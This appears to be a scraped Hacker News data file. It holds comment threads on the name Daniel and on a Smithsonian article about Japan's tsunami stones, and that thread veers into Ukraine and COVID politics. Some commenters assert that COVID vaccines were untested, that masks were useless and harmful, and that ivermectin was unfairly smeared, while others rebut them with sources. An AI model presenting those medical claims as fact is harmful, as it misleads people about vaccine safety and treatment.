https://en.wikipedia.org/wiki/R._Daneel_Olivaw reply kwhitefoot 17 hours agoprevThat was fun and very much in the spirit of Hacker News. reply danielodievich 14 hours agoprevApparently my parents didn't know what to name me for about a week and eventually settled on Daniel, in this spelling it was a very unusual name in Soviet Union at the time. I think they liked some famous polish actor https://en.wikipedia.org/wiki/Daniel_Olbrychski. A more slavic spelling of this is Danilo but it was even less popular than Daniel. I knew only one other Daniel and he was a son of family's friends and apparently named after me. I didn't much care for him, but that's beside the point. Coming to USA and it was a bit sad to no longer have a very unique name. It's okay though, my last name is very unique... reply pureheartlover 10 hours agoprevMy mum said she named me after Elton Johns song 'Daniel' - Rumoured to be his long lost gay lover. Thanks mum. reply SoftTalker 6 hours agoparentLyricist Taupin said that the story intends to be about a man, returning to a small-town after the war, who longs to return to the life he had before. https://americansongwriter.com/daniel-by-elton-john-and-bern... reply JohnMakin 16 hours agoprevWord of caution on giving children “interesting” or cute names - my father’s legal first name was a variation on “daniel” (a common nickname) and since his passing and becoming the executor of what little was left of his estate, I was astounded at how many stupid issues he had with credit reports and even dumb things like utility bills incorrectly “correcting” his name to Daniel. reply Spooky23 6 hours agoparentCredit agencies will screw anything up. My wife and her mother shared the same first name with a different middle name, whose first letter happened to be one off. 20 years after her name changed, they both had issues with messed up records. It got bad when insurance carriers got it jumbled up. reply ginko 15 hours agoparentprevI never understood why people do that in the first place. Sure, call your son Billy but putting William in the documents doesn't hurt. reply vundercind 15 hours agorootparentThose, and even worse the “cute” spelling variations on normal names, are baffling to me. You’ve just condemned your kid to a lifetime of minor (and sometimes more-than-minor) hassles, with very little justification. [edit] I actually think a lot of “bad” celebrity kid names are a ton better than that crap. At least with “Apple” and “Rocket” folks can guess the correct spelling nearly 100% of the time. reply bee_rider 14 hours agorootparentI dunno, I have a pretty weird name from before it became a fad. I’ve enjoyed the benefit of things like instructors remembering my name. It is small but a nice perk. Not sure if it would apply now that everyone has a weird name. Also if your name gets autocorrected maybe it’ll throw the data aggregators off your scent. reply ogab 9 hours agorootparentprevThis is my pet peeve about Duke and Duchess of Sussex naming their kids “Archie” and “Lilibet”. Even Harry’s birth name is “Henry” — Archie’s middle name “Harrison” is clever though. reply triceratops 6 hours agorootparentI don't think those kids will have to worry about credit ratings agencies or bureaucracy reply nickpsecurity 5 hours agoprevI was recently reading in Daniel. Christians like the book of Daniel for its character examples and prophecies. A few examples. 1. The Babylonians took their young people, indoctrinated them into the culture, and tried to turn them against their old one. This happens today in colleges across America. 2. Daniel shows God expects us to be faithful in the little things. They were willing to die over something many people might not care about. They knew God cared (eg Luke 16:10). He blessed their obedience. 3. In Daniel 2, all the wise men, enchanters, magicians, and astrologers failed to interpret the dream. Their world is full of fake people conning others. Matt. 24 and 2 Pet. 2 discuss the false prophets that are everywhere today. Having the real gift, Daniel was able to give an interpretation with a huge impact. This happened to a friend and I doing evangelism last Saturday. The stranger admitted that was the first time an interpretation of his dream made sense with external corroboration. All I can say on that. 4. Daniel’s righteousness at work is both a blessing to his employer and reflects God’s character to others. Eventually, the only thing they can do to take him down is making his prayers illegal. Things like that happen today, too. 5. We see the powerful people trying to be gods. Nebuchadnezzar even puts up an image others are forced to worship. He will harm those who don’t believe. Both Jews and Christians have a long history of people killing them for their faith, esp Nazis and Communists. Recently, China ejected all the Christian missionaries and the ruler is putting his image on churches like he is a god. History repeats. 6. God delivers them from the fire. His presence is also with them in some way while they’re suffering. Those who repent and put faith in Jesus Christ have God’s Spirit in them even when suffering. In some cases, we’re delivered from our enemies or suffering. One boss that set up a group of us unjustly for firing cancelled the writeups. We prayed for help, gangsters randomly shot a family member, and they had to cancel work load to make the wake. Wow… (I’ve also seen more than one miracle healing, including my own PTSD and liver issues.) 7. Prophecies. Atheists demand proof that God’s Word has power, like fulfilled prophecies. God’s Word delivers them in Daniel. Then, atheists claim that would be impossible so they must be after the fact. They don’t have evidence because they don’t allow it. Anyone interested in Daniel’s prophecies can look at these: https://www.gotquestions.org/Daniel-four-beasts.html https://www.gotquestions.org/prophecy-2300-days-Daniel.html Side note on Baal which I saw in the article. God blessed or punished nations based on if they followed Him and acted right. Nations He destroyed turned to idols (esp Baal’s), sexual immorality (pleasure culture), oppression of the poor, and (esp Baal’s) sacrificing their own children for prosperity. All of this is repeating in America after people turned away from Christ. The wrath will, too, if they don’t repent. reply danielpower 18 hours agoprev [4 more] [flagged] danielvaughn 17 hours agoparent [4 more] [flagged] denial 17 hours agorootparent [–] As do I. reply smusamashah 17 hours agorootparent [–] You don't reply tut-urut-utut 16 hours agorootparent [–] Дон’т јоу ај. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The article delves into the historical and cultural importance of the name Daniel, tracing its roots back to ancient Mesopotamia and its mentions in various ancient texts.",
      "It highlights the connections between the Ugaritic, Canaanite, and Israelite cultures, shedding light on the evolution of ethnic identities and kingdoms in the area.",
      "The author emphasizes the enduring popularity of the name Daniel in Christian traditions and its continuity over a 3,400-year history, possibly originating around 600 BCE."
    ],
    "commentSummary": [
      "The blog post explores the religious and cultural significance of the name Daniel, drawing from biblical narratives and linguistic origins.",
      "Participants share personal anecdotes, discuss related names like Gabriel and Michael/Miguel, and debate connections to ancient texts like the Torah and Mahabharata.",
      "Themes of faithfulness, righteousness, and religious persecution are analyzed, connecting biblical accounts to contemporary experiences and career achievements."
    ],
    "points": 172,
    "commentCount": 53,
    "retryCount": 0,
    "time": 1711984650
  },
  {
    "id": 39892533,
    "title": "Tsunami Stones: Japan's Ancient Warnings",
    "originLink": "https://www.smithsonianmag.com/smart-news/century-old-warnings-against-tsunamis-dot-japans-coastline-180956448/",
    "originBody": "SMART NEWS Cool Finds These Century-Old Stone “Tsunami Stones” Dot Japan’s Coastline “Remember the calamity of the great tsunamis. Do not build any homes below this point.” Danny Lewis August 31, 2015 T.KISHIMOTO, via Wikimedia Commons. At the edge of Aneyoshi, a small village on Japan’s northeastern coast, a 10-foot-tall stone tablet stands, carved with a dire warning to locals. \"High dwellings are the peace and harmony of our descendants,\" the rock slab says. \"Remember the calamity of the great tsunamis. Do not build any homes below this point.\" While the Aneyoshi tablet might be the most straightforward, so-called “tsunami stones” dot Japan’s coastline, warning the carvers’ descendants to seek high ground after earthquakes in case they foreshadow destructive waves. The stones vary in degrees of repair, with most dating back to around 1896, when two deadly tsunamis killed about 22,000 people, Martin Fackler writes for The New York Times. “The tsunami stones are warnings across generations, telling descendants to avoid the same suffering of their ancestors,” Itoko Kitahara, a historian of natural disasters at Ritsumeikan University in Kyoto, told Fackler in 2011 after an earthquake killed nearly 29,000 people. “Some places heeded these lessons of the past, but many didn’t,” Kitahara told Fackler. Over the decades, the stones’ warnings were disregarded or forgotten by many as coastal towns boomed and people placed their faith in massive seawalls built by the Japanese government. But in some places like Aneyoshi, residents still heeded the tsunami stones’ warnings. \"Everybody here knows about the markers. We studied them in school,\" 12-year-old Yuto Kimura told the Associated Press in 2011. \"When the tsunami came, my mom got me from school and then the whole village climbed to higher ground.\" Aneyoshi’s tsunami stone is the only one found that explicitly describes where to build houses, but centuries of tsunamis have also left their marks on the names of places in the region, Fackler writes. While some places have names like “Valley of the Survivors” and “Wave’s Edge” that might indicate ground high enough to escape a massive wave, places that weren’t so lucky might instead be named “Octopus Grounds,” after the sea life left behind in the rubble. \"It takes about three generations for people to forget. Those that experience the disaster themselves pass it to their children and their grandchildren, but then the memory fades,\" Fumihiko Imamura, a professor in disaster planning at Tohoku University, told the AP. Four years later, parts of Japan are still recovering from the March 2011 tsunami, with about 230,000 people still living in temporary housing. The tsunami and accompanying earthquake were also responsible for the Fukushima Daiichi disaster, when equipment damaged during the disaster triggered a nuclear meltdown Get the latest stories in your inbox every weekday. Danny Lewis| READ MORE Danny Lewis is a multimedia journalist working in print, radio, and illustration. He focuses on stories with a health/science bent and has reported some of his favorite pieces from the prow of a canoe. Danny is based in Brooklyn, NY. Filed Under: Cool Finds, History, Japan, Tsunami Most Popular Mathematician Who Made Sense of the Universe's Randomness Wins Math's Top Prize The Lesser-Known History of African-American Cowboys Archaeologists Uncover Medieval Castle Hidden Beneath a French Hotel These Century-Old Stone \"Tsunami Stones\" Dot Japan’s Coastline The Ancient Origins of the Easter Bunny",
    "commentLink": "https://news.ycombinator.com/item?id=39892533",
    "commentBody": "Century-old stone \"tsunami stones\" dot Japan's coastline (2015) (smithsonianmag.com)158 points by janandonly 23 hours agohidepastfavorite115 comments frozenlettuce 20 hours agoIn 2011 almost 1k people died after heavy rains in Brazil that caused a whole valley to be flooded (surrounding mountain ranges canalized massive amounts of rainfall into it). On Street View it is possible to see how high the water went, by looking at the stains in the walls https://www.google.com/maps/@-22.3974509,-43.0875373,3a,26.2... Sadly the region is repopulated again - a mix of people building houses to rent to unaware folks, people unwilling to leave behind decades of work, and general faith that they will survive if that's God's will. https://en.wikipedia.org/wiki/January_2011_Rio_de_Janeiro_fl... reply helsinkiandrew 19 hours agoparentPeople have moved into houses built on the \"Love Canal\" toxic dump in Niagara unaware of its history as probably the worst toxic waste catastrophe in the US: https://en.wikipedia.org/wiki/Love_Canal https://www.nytimes.com/2023/06/12/nyregion/love-canal-toxic... (archive: https://archive.ph/UFJ96) reply hinkley 16 hours agorootparentSeattle turned a creosote saturated lakefront area into a city park. And then had to shut it down within a year, scrape all the topsoil off to a deeper depth and replace it. There are actual creosote superfund sites in Puget Sound, from railroad tie manufacture. For some reason the gasworks weren’t one, even though they are a point source of the stuff. reply divbzero 15 hours agorootparentGas Works Park is the Seattle city park referenced above: https://en.wikipedia.org/wiki/Gas_Works_Park https://www.seattletimes.com/life/50-years-since-gas-works-p... The cleanup effort is still ongoing: https://ecology.wa.gov/blog/june-2023/cleaning-up-cleanup-of... reply vkou 9 hours agorootparentprev> Seattle turned a creosote saturated lakefront area into a city park. And then had to shut it down within a year, scrape all the topsoil off to a deeper depth and replace it. You're missing the part where it has been reopened for decades. Just, uh, don't dig or wade in the water. reply hinkley 16 hours agoparentprevIn the southern Midwest and in a few of the arid states, there are areas where flash flooding is a problem. In a heavy rainstorm, the shape of the watershed is such that most of the water shows up at a river or stream bed as a concentrated pulse. That can be particularly dangerous in a seasonal stream bed, because you are more likely to have people in a dry stream bed than a wet one. Of course you also have the problem of people crossing a dry bed and not being able to cross back until the rains stop. There are some famous videos of people getting caught by flash floods in the Middle East as well. The return of the rains seems to have become a spectator sport and people get too close. reply thih9 21 hours agoprev> Aneyoshi’s tsunami stone is the only one found that explicitly describes where to build houses As for others, “Some act as monuments, giving death tolls from past tsunamis or marking mass graves of the victims. Others offer more direct advice. A tsunami stone in Kesennuma, a city in the Miyagi Prefecture, reads: ‘Always be prepared for unexpected tsunamis. Choose life over your possessions and valuables.’” - source: https://www.atlasobscura.com/places/tsunami-stones reply kurthr 15 hours agoparentIf you find coral deposited more than 100ft above sea level, it's another marker of danger... although perhaps on a longer time scale. Hawaii has several examples of this (coral found at sites over 500ft) from what are assumed to be Mega-tsunami. https://www.e-education.psu.edu/earth107/node/1610#:~:text=O.... reply thih9 12 hours agorootparent> another marker of danger Note that tsunami stones, except one, are not markers of danger, at least not in a precise, spatial sense. They’re like memorial plaques, listing past casualties or marking gravesites. See grandparent comment. reply stuff4ben 20 hours agoprev> \"It takes about three generations for people to forget. Those that experience the disaster themselves pass it to their children and their grandchildren, but then the memory fades,\" Some similarities to lessons from the 1918 flu epidemic that we relearned in 2020. We should build some \"COVID stones\" so we don't forget. reply musha68k 19 hours agoparentTime to do everything to keep the memories and learnings of WWII alive. 79 years ~ 2.6 generations reply hinkley 16 hours agorootparentThe rise of nazism in America says we are already too late. We do tend to have slightly shorter memories than Europe. Learn from our mistakes. reply iamthirsty 14 hours agorootparent> The rise of nazism in America says we are already too late. This isn't a new thing, unfortunately. Given that the KKK has been around for 100+ years — and the fact that the Eugenics movement really started in the United States[1] (so clearly so that Hitler mentions it in Mein Kampf), Nazism & Hyper-Nationalism have been in and out of fashion for over a century and we are still here. [1]:https://www.barnesandnoble.com/w/the-guarded-gate-daniel-okr... reply roughly 18 hours agorootparentprevWhat’s particularly worrying is the dwindling number of people who’ve actually been in the presence of an atomic detonation. reply vanderZwan 17 hours agorootparentBeing in the presence of an atomic detonation will do that to you, I suppose. reply roughly 16 hours agorootparentYeah, there's a real sweet spot there - close enough to really get the immensity, far enough away to tell people about it. reply bombcar 15 hours agorootparentThe last atomic test was in 1992, so we have some years left. reply 1letterunixname 11 hours agorootparentprevYep. This is the average societal memory horizon. The absolute cultural memory horizon tends to be roughly 250 years (10 generations) as that's about when most civilizations fail. At least once every generation, there is a moral or cultural test event that pushes that civilization writ large closer to disorder or makes it stronger by recovery, preparedness, and prevention. reply mantas 19 hours agorootparentprevLooking at drama around Ukraine war, it’s already lost. reply ekanes 19 hours agorootparentI see the opposite. A nation state aggressively attempted to take over another, and the world reacted swiftly and largely in unison. The lesson seems learned, at least for now. If the lesson had been lost, everyone would have done nothing. reply BurningFrog 18 hours agorootparentThe NATO countries reacted in unison. The rest of the world cares as much as we do about the wars in Africa. reply zdragnar 16 hours agorootparentprev> the world reacted swiftly and largely in unison The western world. Don't forget that the early economic sanctions were largely ignored by the BRICS countries, which make up ~45% of the world's population. reply jewayne 18 hours agorootparentprevExcept half of Americans are rooting for Putin. reply Nevermark 18 hours agorootparent> Except half of Americans are rooting for Putin. Both \"half\" and \"rooting\" are exaggerations. No need for that. But yes, a depressing number of one party's politicians are willing to use Ukraine foreign policy as a domestic division issue. reply jewayne 15 hours agorootparentI do not feel that is an exaggeration whatsoever. About half of Americans would prefer to see Russia win the war. I think I'm getting downvoted for speaking the plain truth. reply weberer 54 minutes agorootparent>I do not feel that is an exaggeration whatsoever That's the problem. Now lets see how the facts compare to your feelings. https://www.pewresearch.org/politics/2022/03/15/public-expre... >More than eight-in-ten Democrats and Democratic leaners (88%) and Republicans and Republican leaners (85%) favor keeping strict economic sanctions on Russia. And at least six-in-ten in each party strongly favor maintaining strict sanctions (68% of Democrats, 61% of Republicans). Chart shows Democrats much more supportive of admitting Ukrainian refugees to the U.S. than are Republicans >Similar shares of Republicans (75%) and Democrats (81%) favor keeping a large military presence in NATO countries located near Ukraine. And there is limited support among both Republicans and Democrats for taking military action, even if it risks a nuclear conflict with Russia: About a third of the public (35%) and nearly identical shares of Democrats (35%) and Republicans (36%) favor this. This took less than 30 seconds to look up, btw. reply Terr_ 14 hours agorootparentprev> About half of Americans would prefer to see Russia win the war. My brother in pro-democracy, you are literally exaggerating right now. If half the US adult population people really wanted Russia to conquer Ukraine, you would be able to easily cite polls showing it in rather stark terms. Yes, it's definitely become a red/blue partisan issue, and yes, Republican \"leadership\" needs to be raked over the coals for their extended support for the Emperor's New Clothes, and yes, if Russia won they'd probably make up a bunch of \"this is fine\" nonsense... However!--Even if you assumed every single person of any party who thought \"the US gives too much aid\" was actually a crypto-Putinist hiding their dark desires for an outright Russian victory... Well, that's still only 37%. [0] That far-reaching assumption almost certainly wrong through, especially since general sentiment toward Russia has almost hit rock-bottom. [1] That's why nobody even bothers polling for \"which country would your rather see win.\" [0] https://apnews.com/article/poll-ukraine-aid-congress-b772c97... [1] https://news.gallup.com/poll/1642/russia.aspx reply jstanley 16 hours agorootparentprevDoesn't it take 2 sides to make something a division issue? reply jewayne 15 hours agorootparentYour mom milks babies for their blood. Now, don't go and make this a division issue by disagreeing with me. reply Nevermark 12 hours agorootparentprevDo you also think it takes two sides to start a war? What on Earth was Ukraine thinking of by taking Russia's bait and getting involved in its own invasion! /light humor reply DudeOpotomus 14 hours agoparentprevThe Fourth Turning and his newer one, The Fourth Turning is Here by Neil Howe goes into this phenomenon and how it shapes society and humanity. It's roughly 80 years in length and covers 4 generations of archetypes. Every society, every culture, everywhere for as long as we know... reply cameldrv 7 hours agoparentprevI think cycles of forgetting run faster these days. A whole bunch of cows in Texas have H5N1 flu now, and they're not stopping them from selling the cows, so they're now infecting herds in other states. Just yesterday a dairy worker in Texas came down with H5N1. reply jstanley 20 hours agoparentprevWhat are the lessons from COVID? reply 01HNNWZ0MV43FF 20 hours agorootparentI came out of it fine. I wish some other people had learned: - That a respiratory disease can spread quickly before you show symptoms, and kill millions - That even though the government is wrong a lot, sometimes they're right about important things - That you don't get to defect from polite society one day and then whine about being an outcast the next. Of course I'm mad at people who refused to take any precautions at all. They made things worse. reply themaninthedark 17 hours agorootparentHere are my takeaways: - The government will lie to you because it is not prepared. - They will then spin on a dime with no consequences and all those who were towing the line will switch with them. - Those who follow the government's direction will ostracize people in both cases and doesn't matter because they are \"right\". reply hinkley 15 hours agorootparentChaos helps no one. It’s why even the democratic world has martial law. We may be wrong together but at least we are together. Having people running in three directions at once will get everyone killed in wartime or disaster. Once the avalanche starts it is too late for the pebbles to vote. reply themaninthedark 14 hours agorootparentI strongly disagree; People have agency, rocks and geological forces do not. >We may be wrong together but at least we are together. Is a great way to get everyone killed. We, in the west love to tout how our diversity and free thinking makes us better than those who do not have those values. What I saw were a bunch of countries that wished they could rule the populace in the same manner as China and Saudi Arabia. If we can not uphold our values when we face difficulties, then they are not values. You speak of martial law and preventing chaos. Envision the outcry and response if Trump had enacted such a policy in early February when members of the Democratic Party were encouraging people to gather in crowds to show support for Chinese New Year? reply numpad0 14 hours agorootparentprevI'm not so sure. To me it seems people just could not stand masks to the point it actually created ongoing planetary scale mental health crisis. :shrug:. reply kevin_thibedeau 8 hours agorootparentprevWhile there's plenty of blame to go around for the government's disinformation campaign, never forget that the entire cast of FauxNews personalities were decrying the initial cautionary stance as a politically motivated hoax and then turned around and changed their tune when it didn't turnout to be a dud like SARS 1.0. https://www.youtube.com/watch?v=ifKbwDf51bA reply OCASMv2 16 hours agorootparentprev> That even though the government is wrong a lot, sometimes they're right about important things They weren't right during the pandemic though. From initially refusing to acknowledge the situation to lying and cohercing people into taking untested injections whose side effects on the population remain unknown, and of course censoring and character assassinating anyone who dared rise any objections against its conduct. And lets not forget actively avoiding finding out the origin of the virus because it wasn't politically convenient during an election year. reply hinkley 15 hours agorootparentWe had infrastructure that would handle a pandemic and that fuckface traitorous loser dismantled it. reply OCASMv2 15 hours agorootparentWhat specifically would have been different with that infrastructure in place? reply wewtyflakes 16 hours agorootparentprevThis does not seem to disprove the statement of \"That even though the government is wrong a lot, sometimes they're right about important things\". reply OCASMv2 14 hours agorootparentIn the context of the pandemic response, without any specifics on what they got right I think it does. reply wewtyflakes 14 hours agorootparentTo disprove \"That even though the government is wrong a lot, sometimes they're right about important things\", you would have to prove that the government is wrong _all_ the time about important things. You just mentioned some things you think the government got wrong, but that is covered by the clause \"That even though the government is wrong a lot\" anyway. So it then just seems you wanted to soapbox about covid and governments, even if that isn't your intent. reply OCASMv2 14 hours agorootparentIn the context \"lessons we learned from covid that we shouldn't forget\", \"the government is sometimes right about important things\" cannot be one of them without specifics on what is it they supposedly got right. reply wewtyflakes 14 hours agorootparentHow about wearing masks, minimizing in-person interactions, and funding medical research, during the height of the pandemic? Those seem reasonable. reply OCASMv2 13 hours agorootparent> wearing masks Reasonable at first. Once it was known that the virus is transmitted via aerosols then forcing masks was the wrong thing to do, specially on children. Useless and damaging. > minimizing in-person interactions What benefit did it achieve? As a quarantine it was too leaky and it also led to mass psychological distress. > funding medical research What medical research? For some reason, the most obvious approach, repurposed drugs, was nowhere in sight. If anything demonizing it was the official policy (ie. the smear campaign against ivermectin). reply wewtyflakes 12 hours agorootparent> Useless and damaging. This seems like a ridiculous thing to say; both useless _and_ damaging? Even if one of these things were true, they can't _both_ be true. > What benefit did it achieve? Minimizing the spread of covid. > What medical research? https://en.wikipedia.org/wiki/Operation_Warp_Speed > the most obvious approach, repurposed drugs, was nowhere in sight Didn't the J&J vaccine use a more traditional approach? https://en.wikipedia.org/wiki/Janssen_COVID-19_vaccine Also, people tried repurposing drugs (see https://en.wikipedia.org/wiki/Ivermectin#COVID-19). So your claim of \"nowhere in sight\" is incorrect. reply toast0 10 hours agorootparent> Didn't the J&J vaccine use a more traditional approach? https://en.wikipedia.org/wiki/Janssen_COVID-19_vaccine Not really. This was the first widely deployed modified adenovirus vaccine. Not the first developed, but if I'm remembering correctly, none of the others made it out of trials. reply OCASMv2 10 hours agorootparentprev> This seems like a ridiculous thing to say; both useless _and_ damaging? Even if one of these things were true, they can't _both_ be true. Of course they can: useless at preventing disease, damaging to the social development of children. > Minimizing the spread of covid. Did it? > https://en.wikipedia.org/wiki/Operation_Warp_Speed The result: injections sold as vaccines that don't do what you expect a vaccine to do: stop transmission. > Also, people tried repurposing drugs (see https://en.wikipedia.org/wiki/Ivermectin#COVID-19). Individuals did, not the government, and the former were punished by the latter for it. reply MeImCounting 8 hours agorootparent\"noun 1. a substance used to stimulate immunity to a particular infectious disease or pathogen\" Vaccines activate immunity against specific pathogens, reducing infection severity and transmission risk. COVID-19 vaccines decrease disease severity and transmission probability. This whole thing of \"they arent vaccines\" is bologna and everyone knows it reply cyberax 12 hours agorootparentprev> Reasonable at first. Once it was known that the virus is transmitted via aerosols then forcing masks was the wrong thing to do, specially on children. Useless and damaging. And that's the reason we have governments for. So that people like you can't do unlimited damage. You can privately hate the government, but as long as you follow the rules, the damage is contained. Masks saved people, including children: https://www.ncbi.nlm.nih.gov/pmc/articles/PMC9968482/ reply OCASMv2 10 hours agorootparent> this paper does not estimate the effect of wearing masks, but rather the effect of mandating mask wearing This study doesn't control its variables properly. Places with no mask mandates are also places where people typicaly didn't take other precautions such as avoiding mass gatherings. reply cyberax 9 hours agorootparentAnd? You mentioned that masks were harmful to children, without citing a single reliable source. reply OCASMv2 4 hours agorootparent\"The hypotheses for the influence of face mask wearing on emotion recognition were partially supported. Results showed that whereas anger was better recognized, happiness and sadness were impaired in their recognition. ... Therefore, the differential impact of face masks on emotion recognition can have an effect on children’s social interactions. For example, better recognition of anger can facilitate greater physical and social distance from one another (Calbi et al., 2021). On the other hand, lower recognition of happiness and sadness can be potentially detrimental for children’s social interactions. Happiness has been identified as key to boosting social interactions (Quoidbach et al., 2019), whereas recognizing sadness in others is important to display appropriate interpersonal emotion regulation (Kwon & López-Pérez, 2022).\" https://www.ncbi.nlm.nih.gov/pmc/articles/PMC9637007/ reply FireBeyond 9 hours agorootparentprev> What medical research? For some reason, the most obvious approach, repurposed drugs, was nowhere in sight. What? The vaccines we do have are because we have vaccines for coronaviruses in animals and had nearly a decade of work for using them in humans. > the smear campaign against ivermectin The smear campaign against a drug that did not, does not, and could not work, because it is an antiparasitic, not an antiviral? Combatting disinformation (and at a certain point, it became deliberate disinformation) is not a \"smear campaign\". reply OCASMv2 4 hours agorootparent> The vaccines we do have are because we have vaccines for coronaviruses in animals and had nearly a decade of work for using them in humans. Which vaccine specifically are you talking about here? > The smear campaign against a drug that did not, does not, and could not work, because it is an antiparasitic, not an antiviral? I see you haven't checked out the research that's been done this past decade: https://portlandpress.com/biochemj/article/443/3/851/80615/I... reply snakeyjake 14 hours agorootparentprev>cohercing people into taking untested injections The vaccines were extremely well-tested and anyone saying they weren't is either lying or was lied to by a liar. They did not follow the typical drug approval process. That does not mean they were not tested. I was one of the test subjects. reply OCASMv2 13 hours agorootparent> The vaccines were extremely well-tested and anyone saying they weren't is either lying or was lied to by a liar. Starting human trials before animal trials were finished is not what I'd call \"extremely well-tested\". The standard testing procedure takes years. These injections were forced upon hundreds of millions of people after only a few months of testing, and that's even assuming that what little testing was done was done properly. reply FireBeyond 9 hours agorootparent> Starting human trials before animal trials were finished is not what I'd call \"extremely well-tested\". Citation needed. The FDA paperwork to authorize human trials and emergency authorization referenced the completed animal trials. > The standard testing procedure takes years. While testing processes do typically take years, this also factors in the production to testable levels of said vaccines, whereas mRNA vaccines are far more quickly and efficiently produced, reducing this time dramatically. Also to be taken into account, work on coronavirus vaccination in humans had already been in the pipeline since the Avian Flu crises. This wasn't something new. > These injections were forced upon hundreds of millions of people after only a few months of testing Most people couldn't access the vaccine for much longer periods of time. Certainly no-one was being forced early on (and that goes for varying definitions of the word 'forced'). Sources: - https://apnews.com/article/fact-check-covid-vaccines-animal-... - https://www.reuters.com/article/idUSL2N2NJ1IK/ - https://www.usatoday.com/story/news/factcheck/2021/09/10/fac... reply OCASMv2 4 hours agorootparent> https://apnews.com/article/fact-check-covid-vaccines-animal-... > CLAIM: Animal studies for COVID-19 vaccines were “stopped” because the animals were dying. Not my claim. > https://www.reuters.com/article/idUSL2N2NJ1IK/ > COVID-19 vaccines did not skip animal trials because of animal deaths Again, not my claim. > https://www.usatoday.com/story/news/factcheck/2021/09/10/fac... > Now some proponents of the anti-parasitic drug traditionally used for animals are falsely claiming COVID-19 vaccinations haven't passed animal studies. Not my claim either. This is my claim: human trials started before animal trials were finished: https://ncirs.org.au/phases-clinical-trials > While testing processes do typically take years, this also factors in the production to testable levels of said vaccines, whereas mRNA vaccines are far more quickly and efficiently produced, reducing this time dramatically. The quickness of production is unrelated to how long it takes to test its effects. > Also to be taken into account, work on coronavirus vaccination in humans had already been in the pipeline since the Avian Flu crises. This wasn't something new. Can you point out the mRNA vaccines developed then? > Most people couldn't access the vaccine for much longer periods of time. Certainly no-one was being forced early on (and that goes for varying definitions of the word 'forced'). Yes, lets pretend vaccine mandates didn't happen. reply snakeyjake 7 hours agorootparentprevAntivaxxers are the geocentrists of the modern age. Facts are irrelevant, for it is a religion-- half cult of individual superiority and half uncontrollable iconoclasm. reply OCASMv2 4 hours agorootparentDefine \"antivaxxer\". reply cyberax 12 hours agorootparentprev> From initially refusing to acknowledge the situation to lying and cohercing people into taking untested injections whose side effects on the population remain unknown You're spewing bullshit right here. COVID vaccines went through clinical trials and had a great safety profile. reply mistermann 17 hours agorootparentprevIs it acceptable to get mad at all suboptimal behaviors during that debacle, or only a subset of them? And if a subset: who decides, how do they decide, and who made the decision that this is the obligatory structure that we all must adopt without being asked for agreement? reply hinkley 16 hours agorootparentprevThe worst was a local meetup member who worked for a company that either made vaccines or worked in virology and still didn’t get his vaccinations. He had all these bullshit reasons he dressed up as science. He got screamed at by the oldest person in the group and stopped showing up. But goddamn. Vaccines don’t work on everyone who takes them, and they tend to be less effective in the elderly. Every one of those people are counting on the rest of us to not bring shit to their doorsteps. reply eej71 18 hours agorootparentprevI agree with what I think is the implied premise of your question - which - I'd make explicit as - its not clear we can agree what the lessons even were? For example, was it good that we closed parks? Remember when sand was poured into skateparks? Or the parks in NYC were padlocked? Was it good that we closed schools for so long? Remember the amount of shaming that happened when some people went to the beaches? Remember when the grocery stores had arrows about which way the direction of the aisle went? Remember how long we handed out bacteria wipes as though it was spread through dirty surfaces? I'm not sure us peons in society are the only ones who need to learn lessons here. reply SandalsAndSocks 20 hours agorootparentprevI think COVID (and the 2020 events, especially in the USA - I was living in Minneapolis at that time, so I might be biased) increased mental health awareness. For everyone, but especially for \"essential workers\". Supply chain improvements have been made to increase diversification and resilience. There was a lot of individualism to cast a shadow, but also cooperation and solidarity was shining on a small scale (hobbyist 3d-printing and donating shields and face mask relief thingies), but also globally. Without getting into the healthcare and technology advancements we accomplished as a species. reply hinkley 15 hours agorootparentI guarantee you stock prices will go up in ten years when new CEOs dismantle all that redundancy in order to improve profit margins for two quarters. reply wpietri 18 hours agorootparentprevIf you look at the flu seasons, I think one of the lessons is that relatively modest behavioral and infrastructural changes could radically reduce harm from respiration-transmitted diseases. However I think it's a lesson that went mostly unlearned. The future I was expecting was a strong increase in ventilation, widespread adoption of CO2 measurements in public spaces (in the same way we measure temperature and humidity now), and experiments with things like UV to reduce disease particle viability. Along with behavioral changes, like staying home when sick, some continued use of masking, and use of mRNA techniques so people get something like quarterly vaccines that cover all the diseases we're trying to keep in check. What I instead got was an anti-science politicization of reasonable public health measures that 20 years ago would have been inconceivable. And then a giant collective shrug where we see plenty of ongoing death and a continuing rise of long Covid such that we have millions partly or wholly disabled. Including with brain fog, a symptom that I, as a programmer, would fine particularly devastating. reply hinkley 15 hours agorootparentTwo of my local haunts have UV lights and a number of places have much better ventilation now. It’s not every place but it’s some. The other thing we should bring back are brass and silver handles. Both of which can kill surface germs almost instantly. It has to be unlaquered though and you’ll find a lot of brass coated in plastic to keep it from corroding. reply stuff4ben 20 hours agorootparentprevFor me, it's being prepared essentially. Having a supply of masks, toilet paper, meds, emergency supplies, etc. reply nilamo 8 hours agorootparentprevThat most of my neighbors are assholes. Before, I merely assumed. reply renewiltord 19 hours agorootparentprevFunny. What appear to be the \"lessons of COVID\" appear to be a reinforcement of people's own beliefs. One could just as well \"learn from COVID\" that: The government is correct when they request large-scale public health interventions and you should go along with it when it makes large scale interventions since some of these require coordination on an urgent time-scale. and just as well that Paternalism does not work. Providing diktats from the throne result in some quarter of the population revolting against the idea, causing coordination failure. Whether one chooses the former or the latter seem entirely dependent on one's preconceived beliefs. reply TheOtherHobbes 18 hours agorootparentAnd also on whether or not one is aware of the number of deaths avoided by government action, and the documented existence of disinformation networks which were - and still are - promoting extremes of polarised social division and self-harm. reply hinkley 15 hours agorootparentSome people got twisted up in Fauci’s stated estimates being off by a factor of two, and people using bad math to say they were off by a lot more than that. When only 25% of the population has been exposed you expect 1/4 of the projected death toll. Then multiply by 2 and now you’re pushing an order of magnitude. But what we are seeing is a pretty steady .9% mortality rate for people who are exposed. Meanwhile the fatality rate for this last flu season was 1/16th of COVID (which is another comparison they liked to make). The problem with 1% is that almost everyone will know someone who died. But they took it like the odds of winning the lottery. Let’s just gamble that’s a small number! reply lurking15 14 hours agorootparent> But what we are seeing is a pretty steady .9% mortality rate for people who are exposed. The distribution of risk is almost entirely concentrated on people who have so few years left in their life compared to the rest of humanity whereas the burden of all the interventions falls squarely on the young, who DO propagate humanity into the future, and who are at essentially no major risk. Representing covid as a .9% generalized risk is nothing short of willful (self?) deception. reply mistermann 17 hours agorootparentprevIt is perhaps worth noting: - it is not possible to be aware of aware of the number of deaths avoided by government action, because counter-factual 